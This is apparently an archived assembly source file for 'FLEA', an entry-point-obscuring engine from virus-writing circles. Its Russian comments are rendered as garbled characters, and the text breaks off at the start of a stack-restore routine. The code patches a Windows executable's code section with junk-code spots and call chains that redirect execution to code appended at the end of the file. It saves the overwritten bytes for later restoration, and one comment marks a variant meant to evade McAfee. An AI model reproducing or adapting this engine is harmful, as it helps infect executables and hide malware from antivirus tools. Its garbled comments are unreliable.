; ------------------------------------------------------------
; name      Cryptor
; type      research
; cve       —
; year      unknown
; os        Multi
; authors   unknown
; source    vxunderground
; archived  vxunderground, krisyotam (2026)
; notes     —
; ------------------------------------------------------------
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ; 
;                                                                                                        ;
;                        xxxxxxxxxxx   xxxx          xxxxxxxxxxx     xxxxxxxxxx                          ; 
;                        xxxxxxxxxxx   xxxx          xxxxxxxxxxx    xxxx   xxxx                          ;
;                        xxxx          xxxx          xxxx          xxxx    xxxx                          ;
;                        xxxx          xxxx          xxxx          xxxx    xxxx                          ;
;                        xxxxxxxxx     xxxx          xxxxxxxxx     xxxx    xxxx                          ;
;                        xxxxxxxxx     xxxx          xxxxxxxxx     xxxx xx xxxx                          ;
;                        xxxx          xxxx          xxxx          xxxx xx xxxx                          ;
;                        xxxx          xxxx   xxxx   xxxx          xxxx    xxxx                          ;
;                        xxxx          xxxxxxxxxxx   xxxxxxxxxxx   xxxx    xxxx                          ;
;                        xxxx          xxxxxxxxxxx   xxxxxxxxxxx   xxxx    xxxx                          ;
;                                                                                                        ; 
;                                                                                                        ;   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                         UEP ENGINE                                                     ;
;                                            FLEA                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;                                                                                                        ;
;                                           :)!                                                          ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                       ������� FLEA                                                     ;
;                                      ���(��) ������                                                   ; 
;                                                                                                        ;
;                                                                                                        ;
;����:                                                                                                   ; 
;1 �������� (� ������������) - ����� ��������� (UEPGEN) (�� �������� ������ ����)                        ;
;--------------------------------------------------------------------------------------------------------;
;�����:                                                                                                  ;
;EAX - ���������� ����������� ����� ����� �����                                                          ;
;(� ����� ����� �������: ������ ����� � ������� ������ � ����������� ����������� ������������ ����       ; 
;--------------------------------------------------------------------------------------------------------;
;�������:                                                                                                ;
;���������, ��������� �� ������� ������� � �������� ���������, �� ��������, �.�. ������ � ��� �����      ;
;������ ������� ������ �������� ���� ��.                                                                 ; 
;                                                                                                        ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  
;                                                                                                        ;
;                                           !                                                            ;
;                                                                                                        ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;                                                                                                        ;
;                                   �������� ���������                                                   ;
;                                        UEPGEN                                                          ;  
;                                                                                                        ;
;                                                                                                        ;
;UEPGEN struct                                                                                           ; 
;   rgen_addr           dd  ?   ;����� ���������� ��������� ����� (���)                                  ;
;   tgen_addr           dd  ?   ;����� ���������� �������� ����������                                    ;  
;   mapped_addr         dd  ?   ;���� �������� ����� (MapViewOfFile)                                     ; 
;   xsection            dd  ?   ;IMAGE_SECTION_HEADER ������, � ������� ����� ����� �������� ����������  ; 
;   reserved1           dd  ?   ;���������������                                                         ;  
;MORPHGEN   ends                                                                                         ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                   �������� ���������                                                   ;
;                                         T2GEN                                                          ; 
;                                    (aka TRASHGEN)                                                      ; 
;                       (����� ��������� �������� ������ � ������ xTG)                                   ; 
;                                                                                                        ;
;                                                                                                        ;
;TRASHGEN   struct                                                                                       ;
;   rgen_addr       dd      ?   ;����� ���������� ��������� ����� (���)                                  ;
;   buf_for_trash   dd      ?   ;����� (�����), ���� ���������� ������������ (���, ������������) ������  ;
;   size_trash      dd      ?   ;������ (� ������), ������� ������ ��������                              ;
;   regs            dd      ?   ;������� �������� (2 ��)                                                 ;
;   xmask1          dd      ?   ;64-������ ����� ��� ���������                                           ;
;   xmask2          dd      ?   ;�������� ������ (��� ������)                                            ;
;   beg_addr        dd      ?   ;��������� �����                                                         ;
;   end_addr        dd      ?   ;�������� �����                                                          ;
;   mapped_addr     dd      ?   ;��������������� (���� ���� ������� (��� ����� ����� � ������))          ;      
;   reserv1         dd      ?   ;��������������� (��, ����� �����-�� ��� ��� � �����)                    ; 
;TRASHGEN   ends                                                                                         ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                           !                                                            ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;                                                                                                        ;
;                           ��������� � ����� ��������� UEPGEN:                                          ;  
;                                                                                                        ;
;                                                                                                        ;
;[   rgen_addr   ] :                                                                                     ; 
;                    ��� ��� ������ ������ (FLEA) ���������� ��� �������� � ������-���� ������� ������,  ;
;                    � ��� ��������� ������ (� ��������� ������ ���) ����� ���, ������� ����� ���        ; 
;                    �������� � (������) ���� ���������.                                                 ;
;                    �����: ���� ����� FLEA ����� ������������ ������ ��� (� �� ���, �������             ;
;                    ���� � ��� � ���������), ����, ����� ���� ������ ��� �������� � �������� 1-��       ;
;                    (� �������������!) ��������� � ����� ����� (������� ��� N), ��� ��� ����� ����� �   ;
;                    ��������� [0..n-1]. � �� ������ ������ ��� ������ ���������� � EAX ��������� �����. ;  
;                    ��������� �������� ������ �������� �����������. ���.                                ; 
;--------------------------------------------------------------------------------------------------------; 
;[   tgen_addr   ] :                                                                                     ;
;                    ����������, ��� � � ���������� ����� ���������. ������ ����� ��������� ������       ;
;                    ������ ���� �������� � ����, ��� xTG (� �������� ����� ����� ���������� ���� � ���  ;
;                    ���-���).                                                                           ;
;--------------------------------------------------------------------------------------------------------;
;[  mapped_addr  ] :                                                                                     ; 
;                    � ���� ���� �������� ���� �������� �����. ��� ������, �������� ���������� �����     ; 
;                    ������ ����� MapViewOfFile.                                                         ; 
;--------------------------------------------------------------------------------------------------------; 
;[   xsection    ] :                                                                                     ;   
;                    ����� ���������� ���� 0, ���� IMAGE_SECTION_HEADER (� ������) ��� ������, �         ; 
;                    ������� ����� ��������� ������ ����� �������� ���������� ������ uep-������.         ; 
;                    ���� ����� 0, �� ���������� ����� �������� � ����� ��������� ������.                ;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;                         
;                                                                                                        ;
;                                          �������                                                       ;
;                                                                                                        ;
;                                                                                                        ;
;1) ��� �������� ����� ����� (�� ���� ��� ��������� �����) ������� ������� (�������) ������� FLEA.       ;
;2) ��� �������������� ����� ����������� ���� ������� ������� FLEA_RESTBYTES (�������� �����������       ;
;   ������� ������� ������ ������ �������� ������� �� ������+������).                                    ;
;3) ��� ��� ����� ������������ ����� ���������� (� ��������, ��������, �������� ret), � ������� �        ;
;   ���������� ����� �������������� � ������� CALL'��, �� � ����� ����� ������ ��������. � ����� �����   ;
;   ���� ��������������, ������� ������� FLEA_RESTSTACK. �����: ����� ������� ������� FLEA_RESTSTACK,    ;
;   � ����� �� ������ ���� ��� ������� ������ ������.                                                    ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;                                                                                                        ;
;                                           y0p!                                                         ;
;                                                                                                        ;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                           ����                                                         ;
;                                                                                                        ;
;                                                                                                        ;
;(+) ��������� ���������� ����� �����                                                                    ; 
;                                                                                                        ;
;(+) ����� ����� ��������� ������, � ����� ������ ������� �� ������ (������ ���� � ��������)             ;
;                                                                                                        ;
;(+) ������� �������������                                                                               ; 
;                                                                                                        ;
;(+) ������������� ��� � ���������� ������ (�������� �����, ��� ��� ������ ����������)                   ; 
;                                                                                                        ;
;(+) �����������������                                                                                   ;
;                                                                                                        ; 
;(+) ����� �������� ��� ���������� (� ��������, ��������, �������� ret, � ����� �������� � fake winapi)  ;
;                                                                                                        ;  
;(+) ��� �������� � ������ ������� (��� & trashgen ����� ����� ����� - ������� ����� ����;)              ; 
;       * ����� ��������� ��� ��������������� ������;                                                    ;            
;                                                                                                        ;
;(+) �� ����� WinAPI                                                                                     ;
;                                                                                                        ;
;(+) ���������� ����� ���������� �� ����� ������ ����� ��������� uep-������ (����� �����������)          ; 
;                                                                                                        ; 
;(x) ���������� ������ � ������-��������.                                                                ;  
;                                                                                                        ;              
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                           y0p!                                                         ;
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                        ;
;                                       �������������:                                                   ;
;                                                                                                        ;
;                                                                                                        ;
;1) �����������:                                                                                         ;
;       FLEA.asm                                                                                         ; 
;2) ����� (������ stdcall):                                                                              ;
;       ...                                                                                              ;
;       szBuf       db 100      dup (00h)                                                                ; 
;       ...                                                                                              ;
;       lea     ecx,szBuf                                                                                ;
;       assume  ecx:ptr UEPGEN                                                                           ;      
;       mov     [ecx].rgen_addr,00401000h       ;�� ����� ������ ������ ���������� ���                   ;
;       mov     [ecx].tgen_addr,00401300h       ;�� ����� ������ ������ ���������� �������               ; 
;       mov     [ecx].mapped_addr,00330000h     ;�� ����� ������ ��������� ���� ��������                 ;  
;       mov     [ecx].xsection,0                ;������ � ����, ������ ��� ����� �������� ����������     ; 
;                                               ;�� ����� ��������� ������                               ;  
;                                               ;��������� ��������� ��������.                           ;
;       call    FLEA                            ;�������� ����������� ������                             ;  
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;v1.0 
;������� ������ ������� �����, ������� �������� ������� � ���. 
 


                                                        ;m1x
                                                    ;pr0mix@mail.ru
                                                ;EOF 
                                                                                                  
                                                                                                    





;========================================================================================================
;���������
;========================================================================================================
UEPGEN  struct
    rgen_addr       dd      ?
    tgen_addr       dd      ? 
    mapped_addr     dd      ?
    xsection        dd      ? 
    reserved1       dd      ? 
UEPGEN  ends 
;--------------------------------------------------------------------------------------------------------  
T2GEN   struct                                                                                           ;
    rgen_addr       dd      ?   ;����� ���������� ��������� ����� (���)                                  ;
    buf_for_trash   dd      ?   ;����� (�����), ���� ���������� ������������ (���, ������������) ������  ;
    size_trash      dd      ?   ;������ (� ������), ������� ������ ��������                              ;
    regs            dd      ?   ;������� �������� (2 ��)                                                 ;
    xmask1          dd      ?   ;64-������ ����� ��� ���������                                           ;
    xmask2          dd      ?   ;�������� ������ (��� ������)                                            ;
    beg_addr        dd      ?   ;��������� �����                                                         ;
    end_addr        dd      ?   ;�������� �����                                                          ;
    mapped_addr     dd      ?   ;���� �������                                                            ; 
    reserv1         dd      ?   ;��������������� (��, ����� �����-�� ��� ��� � �����)                    ; 
T2GEN   ends                                                                                             ;
;========================================================================================================




MAX_SPOTS           equ     10                  ;������������ ���-�� ������������ �����             
uportion1           equ     85                  ;������ (� ������) 1-�� ������ ������ 
uportion2           equ     50                  ;������ (� ������) 2-�� ������ ������
MIN_FIRST_PORTION   equ     uportion1-30        ;������������ ������ ������ ������ �� ������ ������� ���-�� ����    
min_jmp             equ     uportion1+uportion2+7+10+30 ;���������� �����������  
max_jmp             equ     min_jmp+200         ;���������� ������������ 

                                                ;����� ���� �������� ��� ��������
begin_address       equ     0                   ;��������� ����� (�������� ������ � xTG.asm, ���� ����� ����) 
end_address         equ     0                   ;�������� �����
mask_trash1         equ     00000000000011111111110101111001b ;����� ��� ������ 
mask_trash2         equ     011110000b          ;2-�� ����� ����� (��������� ������ ��������� �������� ������)  


 


FLEA:                                           ;������ FLEA   
    pushad                                      ;��������� �������� 
    cld 
    mov     ebp,esp                             ;[ebp+00] 
    mov     ebx,dword ptr [ebp+24h] 
    assume  ebx:ptr UEPGEN                      ;ebx - ��������� �� ��������� UEPGEN
    mov     esi,[ebx].mapped_addr      
    assume  esi:ptr IMAGE_DOS_HEADER
    add     esi,[esi].e_lfanew
    push    esi                                 ;[ebp-04] ;��������� ��������� �� IMAGE_NT_HEADERS 
    lodsd
    assume  esi:ptr IMAGE_FILE_HEADER
    movzx   ecx,[esi].NumberOfSections
    movzx   edx,[esi].SizeOfOptionalHeader
    add     esi,sizeof IMAGE_FILE_HEADER 
    assume  esi:ptr IMAGE_OPTIONAL_HEADER 
    push    [esi].AddressOfEntryPoint           ;[ebp-08] ;��������� ����� ����� 
    push    [esi].ImageBase                     ;[ebp-12] ;��������� ���� 
    add     esi,edx 
    assume  esi:ptr IMAGE_SECTION_HEADER
    sub     esp,(sizeof T2GEN + 4 + 80)         ;�������� � ����� ����� ��� ��������� ���������� � ��������� T2GEN (aka TRASHGEN) 
    mov     tgen_struct,esp
    mov     edx,esp
    assume  edx:ptr T2GEN
;-------------------------------------------------------------------------------------------------------- 
    push    mask_trash1                         ;����������� ����� ��� ��������� �����  
    call    gen_mask
    or      al,1 
    mov     xtmask1,eax   
    push    mask_trash2
    call    gen_mask 
    or      eax,01110000b          
    mov     xtmask2,eax 
;--------------------------------------------------------------------------------------------------------    
    push    [ebx].rgen_addr                     ;������� �������� ��������� ���� ��������� TRASHGEN 
    pop     [edx].rgen_addr
    mov     [edx].regs,0FFh
    push    xtmask1
    pop     [edx].xmask1
    push    xtmask2 
    pop     [edx].xmask2
    mov     [edx].beg_addr,begin_address
    mov     [edx].end_addr,end_address
    push    [ebx].mapped_addr
    pop     [edx].mapped_addr   
    xor     eax,eax 
    cdq                       
;--------------------------------------------------------------------------------------------------------
_search_new_ep_:                                ;����� �������� ����� ������� ������ 
    cmp     edx,[esi].VirtualAddress
    ja      _search_code_sec_
    cmp     eax,[esi].PointerToRawData 
    ja      _search_code_sec_    
    mov     edx,[esi].VirtualAddress            ;� ����� �������� ����� ����� ����� (��� ����� ��������� �� ����� ��������� ������)      
    mov     eax,[esi].PointerToRawData
    mov     edi,[esi].SizeOfRawData
    mov     new_ep,edx
    add     new_ep,edi 
;--------------------------------------------------------------------------------------------------------
_search_code_sec_:
    push    eax 
    mov     eax,old_ep
    mov     edi,[esi].VirtualAddress 
    cmp     edi,eax;old_ep
    ja      _nextsection_
    cmp     [esi].Misc.VirtualSize,0
    jne     _vsok_
    add     edi,[esi].SizeOfRawData   
    jmp     _psok_
_vsok_:
    add     edi,[esi].Misc.VirtualSize
_psok_:  
    cmp     edi,eax  
    jbe     _nextsection_  
    sub     eax,[esi].VirtualAddress
    add     eax,[esi].PointerToRawData 
    add     eax,[ebx].mapped_addr   
    mov     start_addr,eax                      ;���� ����� ������� ������, �� �������� ���������� ����� ����� �����, �.�. ������ � ������ ������� �����    
    mov     codesec,esi                         ;� ����� �������� ��������� � �������� ������ �� ������� ������  
_nextsection_: 
    pop     eax
    add     esi,sizeof IMAGE_SECTION_HEADER
    loop    _search_new_ep_ 
;--------------------------------------------------------------------------------------------------------
    mov     esi,codesec                         ;����� �������� ����� ������� ������ 
    mov     eax,[esi].SizeOfRawData 
    cmp     eax,[esi].Misc.VirtualSize
    jbe     _sizecsok_
    cmp     [esi].Misc.VirtualSize,0 
    je      _sizecsok_ 
    mov     eax,[esi].Misc.VirtualSize
     
_sizecsok_:
    add     eax,[esi].VirtualAddress        
    sub     eax,old_ep
    mov     size_codesec,eax
    add     eax,old_ep
    mov     max_codesec_addr,eax  
    mov     edi,imNTh
    assume  edi:ptr IMAGE_NT_HEADERS
;--------------------------------------------------------------------------------------------------------    
_maxvacs_:                                      ;�����, ������ ������������ �����, � ��������� �������:
                                                ;[�����. ����� ����� ����� ; ������������ ����� � ������� ������] 
                                                ;� � ���� ������� ����� ���������� �����. ����� � ������� ������ ����� ���� ���������� �������, tls � �.�.
                                                ;� ���� �� ��������� �� ������ �������, �� ����� ������ ����� 
    mov     eax,[edi].OptionalHeader.DataDirectory[ecx*8].VirtualAddress    
    cmp     old_ep,eax
    ja      _nextdatadir_  
    cmp     max_codesec_addr,eax 
    jb      _nextdatadir_ 
    mov     max_codesec_addr,eax  
_nextdatadir_:    
    inc     ecx
    cmp     ecx,15
    jne     _maxvacs_
;--------------------------------------------------------------------------------------------------------
    mov     eax,max_codesec_addr      
    sub     eax,[esi].VirtualAddress
    add     eax,[esi].PointerToRawData
    add     eax,[ebx].mapped_addr  
    mov     max_codesec_addr,eax                ;�������� ������������ ���������� ����� � ������� ������  
                                                ;���, ������ �������� � ��� ���� 
    mov     eax,start_addr
    mov     cur_codesec_addr,eax

    push    MAX_SPOTS
    call    [ebx].rgen_addr                     ;�������� ��������, ������� ����� �������� � ������� � ������� ������  
    inc     eax  
    mov     num_spots,eax
       
    call    _delta_uep_
_delta_uep_:
    pop     eax
    sub     eax,_delta_uep_
    lea     ecx,[restore_bytes+eax]
    mov     beg_rest_bytes,ecx                  ;� ���� ����� ����� ��������� ������������ ����� �� ������� ������ (������� ��������� �������) 
     
    xor     ecx,ecx     
;-------------------------------------------------------------------------------------------------------- 
_nextaddrforspots_:       
    call    get_jmpaddr                         ;������� ����� ���������� �����, �� ������� �������  
    add     eax,cur_codesec_addr
    push    eax                                   
    add     eax,(uportion1+uportion2+7+10)      ;�������� 2 ������ ������ + max ������ (mov reg,<address>   call reg) (7 byte) + ������ ������� � ������� ��� ������� �������� (6 byte  + 3 byte) + ������ ������� ret (+1 byte)              
    cmp     eax,max_codesec_addr                ;� ������� � ������������ ���������� �������  
    pop     eax 
    jae     _alladdrforspots_                   ;���� ������ ����. ������, �� ����� ������ �� ����� ��������, � ������� �� ����� 
    push    eax                                 ;����� ��������� � ����� �����   
    mov     cur_codesec_addr,eax                ;������� ������� ������� �������� ����� ��� ������ �����  
    inc     ecx
    cmp     ecx,num_spots
    jne     _nextaddrforspots_
_alladdrforspots_:
    mov     num_spots,ecx                       ;�������� ���-�� �����, ������� ����� ����� �������� � ������� ������ 
;--------------------------------------------------------------------------------------------------------
    cmp     cl,1  
    push    0
    pop     eax
    jb      _enduep_                            ;���� ���� �����, �� ������� �� ������      
    mov     eax,esp  
    push    start_addr                          ;����� ������������ ��� ���������� ������ �����, ����� �������  
    je      _nomixaddr_       
;--------------------------------------------------------------------------------------------------------        
    push    ecx
    push    eax
    call    mix_addr                            ;���������� ������ ����� 

_nomixaddr_:    
    xor     edx,edx
    mov     edi,beg_rest_bytes
    stosb                                       ;� 1-�� ����� ����� ��������� ���-�� �����. ���� ��������� ��� 
    mov     cur_rest_bytes,edi 
;-------------------------------------------------------------------------------------------------------- 
_genspot_:
    mov     edi,cur_rest_bytes  
_portion1_: 
    push    uportion1 
    call    [ebx].rgen_addr
    cmp     eax,MIN_FIRST_PORTION
    jb      _portion1_                       
    mov     spot1,eax
    xchg    eax,ecx
    push    uportion2
    call    [ebx].rgen_addr
    mov     spot2,eax
    add     ecx,eax 
    add     ecx,(7+10)                          ;max_size (mov reg,<address>   call reg) (7 byte) + prologue (6 byte) + epilogue (3 byte) + ret (1 byte)    
    mov     eax,ecx
    stosd                                       ;������� �������� � ����. ������ ������ ���������� ����� (��� 1-�� ������ ������ + jmp + 2-�� ������ ������)  
    mov     eax,dword ptr [esp]
    mov     esi,codesec
    sub     eax,[ebx].mapped_addr 
    sub     eax,[esi].PointerToRawData
    add     eax,[esi].VirtualAddress
    add     eax,base
    stosd                                       ;� �������� ������ ���������� ����������� �����, ���� ����� ����� ��������������� ����� ����������� �����        
    mov     esi,dword ptr [esp] 
    rep     movsb                               ;� ����� �������� �����, �� ����� ������� ������� ����� 
    mov     cur_rest_bytes,edi
    pop     edi 
    push    edx
    mov     edx,tgen_struct   
;--------------------------------------------------------------------------------------------------------    
    mov     [edx].buf_for_trash,edi 
    mov     [edx].size_trash,6                  ;������ �������   
    mov     [edx].xmask1,0b
    mov     [edx].xmask2,100b                   ;� ����� ��������� ��������� ������ ������� (��� ������� ���������� ������ ����� �������� ��������� ������ ������)   
    push    edx
    call    [ebx].tgen_addr                     ;������� ������ (push ebp   mov ebp,esp   sub esp,0xXX)           
    push    xtmask1
    pop     [edx].xmask1
    push    xtmask2
    pop     [edx].xmask2  
;--------------------------------------------------------------------------------------------------------    
    mov     [edx].buf_for_trash,eax 
    mov     eax,spot1 
    mov     [edx].size_trash,eax
    push    edx
    call    [ebx].tgen_addr                     ;������� ������ ������ ������       
    xchg    eax,edi
    push    edi
    add     edi,5
    mov     eax,dword ptr [esp+04]
    cmp     eax,num_spots                       ;��������, ������� ��������� ����� ��� ������ �����?
    jne     _nextspot_                          ;���� ��, ����� ������� ��������� �����, jmp � ������� ����� ��������� �� ��������� ������, � �� �� ��������� ����� 
;******************************************************************************************************** 
comment %       
                                                ;������ ���������� ����� 
    mov     esi,codesec                         ;� ������� �������� ������� ��������� ������� ��� jmp (0xE9)                            
    sub     edi,[ebx].mapped_addr
    sub     edi,[esi].PointerToRawData
    add     edi,[esi].VirtualAddress
    mov     ecx,[ebx].xsection
    jecxz   _notxsec_
    assume  ecx:ptr IMAGE_SECTION_HEADER 
    sub     edi,[ecx].VirtualAddress
    sub     edi,[ecx].SizeOfRawData             ;����� ������ call near (0xE8 0xXX 0xXX 0xXX 0xXX)   
    jmp     _finalcall_
_notxsec_: 
    sub     edi,new_ep
_finalcall_:
    neg     edi
    xchg    edi,dword ptr [esp]
    mov     al,0E8h ;0E9h                       ;CALL NEAR 0xXXXXXXXX (0xE8 0xXX 0xXX 0xXX 0xXX)   
    stosb
    pop     eax
    stosd 
        ;%
                          
;comment !                                      ;for mcafe
    mov     edi,new_ep 
    mov     ecx,[ebx].xsection
    jecxz   _notxsec_                           ;���� ���� ������, ������ ���������� ����� ���� �������� � ����� ��������� ������  
    assume  ecx:ptr IMAGE_SECTION_HEADER
    mov     edi,[ecx].VirtualAddress
    add     edi,[ecx].SizeOfRawData    
_notxsec_:
    add     edi,base                            ;� ����� ������   
    xchg    edi,dword ptr [esp]
    mov     al,0B8h                             ;mov    reg32,<address>
    stosb
    pop     eax
    stosd
    mov     al,0FFh                             ;call   reg32 
    stosb
    mov     al,0D0h
    stosb 
        ;!   
    mov     [edx].buf_for_trash,edi
    mov     eax,spot2
    mov     [edx].size_trash,eax
    push    edx
    call    [ebx].tgen_addr                     ;2-�� ������ ������ ��� ���������� ����� 
;--------------------------------------------------------------------------------------------------------
    mov     [edx].buf_for_trash,eax  
    mov     [edx].size_trash,3                  ;������ �������  
    mov     [edx].xmask1,0b
    mov     [edx].xmask2,1000b                  ;� ����� ��������� ��������� ������ ������� (��� ������� ���������� ������ ����� �������� ��������� ��������� ������ ������)     
    push    edx
    call    [ebx].tgen_addr                     ;������� ������ ��� ���������� ����� (mov esp,ebp   pop ebp)           
    mov     byte ptr [eax],0C3h                 ;� ������� ret    
;-------------------------------------------------------------------------------------------------------- 
    pop     edx  
    jmp     _endspot_                           ;������� �� �����  
;********************************************************************************************************  
                                                ;������ ���������� ����� 
_nextspot_: 
    sub     edi,dword ptr [esp+08]              ;��������� �����
    neg     edi
    xchg    edi,dword ptr [esp]
    mov     al,0E8h                             ;CALL NEAR (0xE8 0xXX 0xXX 0xXX 0xXX)   
    stosb
    pop     eax
    stosd 
    mov     [edx].buf_for_trash,edi
    mov     eax,spot2
    mov     [edx].size_trash,eax
    push    edx
    call    [ebx].tgen_addr                     ;2 ������ ������ ��� ���������� �������� 
;-------------------------------------------------------------------------------------------------------- 
    mov     [edx].buf_for_trash,eax  
    mov     [edx].size_trash,3                  ;������ �������  
    mov     [edx].xmask1,0b
    mov     [edx].xmask2,1000b                  ;� ����� ��������� ��������� ������ ������� (��� ������� ���������� ������ ����� �������� ��������� ��������� ������ ������)    
    push    edx
    call    [ebx].tgen_addr                     ;������� ������ ��� ���������� ����� (mov ebp,esp   pop ebp)           
    mov     byte ptr [eax],0C3h                 ;� ������� ret 
;--------------------------------------------------------------------------------------------------------     
    pop     edx
    inc     edx
    jmp     _genspot_  
;-------------------------------------------------------------------------------------------------------- 
_endspot_: 
    mov     edi,beg_rest_bytes 
    mov     eax,num_spots                       ;������������ ���-�� ���������� ����� (�.�. �� ����� �� �� ��������� 1-��� �����, ������� ������ ������������ � ����� �����) 
    inc     eax
    stosb
    mov     eax,start_addr
    mov     esi,codesec
    sub     eax,[ebx].mapped_addr
    sub     eax,[esi].PointerToRawData
    add     eax,[esi].VirtualAddress   
    add     eax,base 
;-------------------------------------------------------------------------------------------------------- 
_enduep_:  
    mov     esp,ebp  
    mov     dword ptr [ebp+1Ch],eax             ;��������� � EAX   
    popad 
    ret     4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ��������/������ FLEA 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx     






;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;������� FLEA_RESTBYTES
;�������������� ����� ����������� ���� (�� ���� �����)
;�����:
;    - ������ ���� ���� :)
;EAX - ���-�� ��������������� ����� (�� ����� ������� ����������� ����� ����������� �����) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
FLEA_RESTBYTES:  
    pushad  
    cld 
    call    _delta_ueprest_
_delta_ueprest_:
    pop     eax
    sub     eax,_delta_ueprest_ 
    lea     esi,[restore_bytes+eax]
    push    esi 
    xor     eax,eax 
    lodsb
    xchg    eax,ebx                             ;��������� � EBX ���-�� ���������� �����    
    mov     edx,ebx 
_nextrestspot_: 
    lodsd
    xchg    eax,ecx                             ;��������� � ECX ������ ���������� ����� 
    lodsd
    xchg    eax,edi                             ;��������� � EDI �����, ��� ��������� ��������� ����� 
    rep     movsb                               ;� ������� �� ����� ����� ����� ������������ (����� �����������) ����� 
    dec     ebx
    jne     _nextrestspot_
    pop     eax
    sub     esi,eax
    xchg    eax,esi
    mov     dword ptr [esp+1Ch],edx   
    popad
    ret   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ������� FLEA_REST 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;������� FLEA_RESTSTACK
;�������������� ����� ����� ����� ����� 
;���� (stdcall) (FLEA_RESTSTACK(DWORD num_spots)):
;num_spots - ���������� ������������ � ������ ����� 
;            (��� �������� ����� �������� �� ������ restore_bytes)      
;�����: 
;������������ �����, � ����� � ECX=0, EAX = ����� �������, ������� ����������� ����� ����� ������ ������ 
;������� (FLEA_RESTSTACK); 
;�������:
;   ��� ��� ������ ����� ������ ������� EBP � ESP (����� EBP  � ����, � ����� �����, ��������� �� 
;   CALL'��), �� ���� ������������ ������ ��������, � �������������� ����.
;   �����: �������� ��� ������� ������ �����, ����� � ����� �� ��� �� ������� ������� ������.   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
FLEA_RESTSTACK:
    pop     eax 
